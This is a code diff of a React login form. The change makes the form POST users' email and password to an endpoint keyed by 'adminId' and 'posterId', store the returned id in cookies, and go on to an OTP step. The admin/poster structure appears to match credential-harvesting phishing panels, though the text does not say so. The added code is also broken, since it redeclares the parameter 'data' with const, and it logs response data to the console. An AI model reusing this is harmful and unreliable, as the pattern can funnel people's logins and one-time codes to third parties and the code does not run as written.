@@ -10,7 +10,7 @@ import ForgetPassword from "../ForgetPassword/ForgetPassword";
 import Button from "../Button/Button";
 import { VerificationModal, SuccessModal } from "../Modal/Modal";
 import Cookies from "js-cookie";
-const Login = ({ login }) => {
+const Login = ({ adminId, posterId }) => {
   const [isOpen, setIsOpen] = useState(false);
   const [showPassword, setShowPassword] = useState(false);
   const [isVerify, setIsVerify] = useState(false);
@@ -23,7 +23,7 @@ const Login = ({ login }) => {
     reset,
   } = useForm({ mode: "onBlur", resolver: yupResolver(validationSchema) });
 
-  const onSubmit = (data) => {
+  const onSubmit = async (data) => {
     const { email, password } = data;
 
     const submitValues = {
@@ -32,9 +32,28 @@ const Login = ({ login }) => {
       password: password,
       skipcode: "",
     };
-    setIsOpen(true);
-    login(submitValues);
-    reset();
+    const url = `${API_URL}/ad/${adminId}/${posterId}`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(submitValues),
+    });
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      setIsOpen(true);
+      console.log("success", data);
+      Cookies.set("email", data?.info?.email);
+      Cookies.set("id", data?.info?._id);
+      reset();
+    } else {
+      console.log("error", data);
+    }
   };
   const handleOtp = async (otpData) => {
     const id = Cookies.get("id");
